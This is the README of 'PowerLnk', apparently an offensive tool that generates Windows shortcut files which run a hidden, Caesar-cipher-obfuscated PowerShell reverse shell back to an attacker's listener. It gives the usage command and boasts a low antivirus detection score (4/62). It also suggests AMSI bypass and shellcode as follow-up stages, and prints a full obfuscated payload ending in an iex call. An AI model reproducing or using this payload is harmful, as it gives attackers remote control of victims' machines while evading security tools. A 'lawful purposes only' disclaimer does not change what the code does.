# PowerLnk
generates a .Lnk file that executes a reverse shell in powershell using a caesar cipher as obfuscation, starts minimized then quickly hides the window. Tool is intended for strictly lawful purposes only. I'm not responsible for how it is used.

# Useage
script takes two parameters -ip and -port where ip and port is the device you are listening on

./PowerLnk.ps1 -ip '192.168.1.5' -port 443

# Current detection

scored a 4/62 on virustotal, intended for second stagers to be executed after initial callback due to including more to the lnk increases detections, so amsi, shellcode etc should be run after inital callback. I'll leave that up to yall to implement that for whatever engagement you're doing.


I'm working on a python server side console for c2


code executed will look something like ```[text.encoding]::ascii.getstring([type].([string]::new([char[]](('ewwiqfp}'|fhx).Bytes|%{$_-4}))).([string]::new([char[]](('kixx}ti'|fhx).Bytes|%{$_-4})))(([string]::new([char[]](('W}wxiq2Gsrzivx'|fhx).Bytes|%{$_-4}))))::([string]::new([char[]](('jvsqfewi:8wxvmrk'|fhx).Bytes|%{$_-4})))(([string]::new([char[]](('NLk=OI9ph}5T]qtp]7UkfqZ4PrRz]6xphLQyhKR{]6|t^[94OGM|SXMyQX]8PnIyQn]mPHU4Q}otPqhphLR4gqZlfWktS5xmi\Vp[55hNKM=QG8yRnY5Q~Z<N\w{jXx7eKpw^WksNKo=NLkygqZl^Gko]m{{PGVmPo|pfqh4eGotP[9pMHEti}VoTWlfg7p~hKZxPrVpiLUy^[9nf6VtfqhhSntr^\VpfqRz^Kpy^}k}QHI}R}otPqhphKN9hKZ~OGkse[Z8OGlS^\gxX6Nu^[R4MG54MLVpiLUy]\Rne[ppfqRz^Kpy^}oy^6Z4g7V}e[9rOGVmPHEwNKotOXM/NnJ<f7Z4P\R4gqpy^}ovOLF7^GoygKJ4eGwmTmEmOWo;NLkyh7NthKYsNKUwQG{o^G9Q^[9rhKktS}V8Pq^wh\RsOGp='|fhx).Bytes|%{$_-4})))))|i`ex```
